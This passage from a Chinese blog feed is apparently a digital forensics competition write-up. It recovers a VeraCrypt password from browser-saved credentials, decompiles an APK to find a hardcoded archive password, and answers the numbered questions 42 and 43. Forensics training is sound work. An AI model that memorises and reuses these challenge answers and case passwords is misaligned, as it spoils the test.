&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;之前备忘录发现的内容Vcpswd:edgewallet，在检材一edge密码中找到对应内容：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709205612210&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709205612210.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709205612210.png&#34; alt=&#34;image-20250709205612210&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;从字面猜测这个密码应该就是vc加密的密码&lt;code&gt;pR7)nZ5&amp;amp;yQ2-oR0&amp;lt;&lt;/code&gt;，而加密卷应该就是那个很大的txt文件&lt;/p&gt;
&lt;p&gt;挂载：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709205220440&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709205220440.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709205220440.png&#34; alt=&#34;image-20250709205220440&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;发现里面存在9月和10月两个名单：

&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709205824323&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709205824323.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709205824323.png&#34; alt=&#34;image-20250709205824323&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
九月是未加密的txt文件，十月却不是txt文件，而是一个pk开头的压缩包，应该是和11月一样的加密方式&lt;/p&gt;
&lt;p&gt;压缩包密码藏在了FileCompress软件中，找出软件安装包（apk）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;FileCompress(com.zs.filecompress).bak/apps/com.zs.filecompress/a
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;导出后，使用jadx逆向：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250710121649367&#34; href=&#34;http://picture.928330.xyz/typora/image-20250710121649367.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250710121649367.png&#34; alt=&#34;image-20250710121649367&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;com下找到主函数，代码逻辑中得到密码&lt;code&gt;1!8Da9Re5it2b3a.&lt;/code&gt;，解密10月和11月：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709210608385&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709210608385.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709210608385.png&#34; alt=&#34;image-20250709210608385&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;小浩的手机号：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;13533333333
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;42完整的受害人名单是几个人&#34;&gt;42.完整的受害人名单是几个人
&lt;/h2&gt;&lt;p&gt;上题得知，一共6人&lt;/p&gt;
&lt;h2 id=&#34;43受害人转账的总金额是多少&#34;&gt;43.受害人转账的总金额是多少
&lt;/h2&gt;&lt;p&gt;检材二中有一次付款，加密备份中有两次付款，每次都是200，通过上下文语境能知道三次付款没有重叠&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;600
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        
    </channel>
</rss>
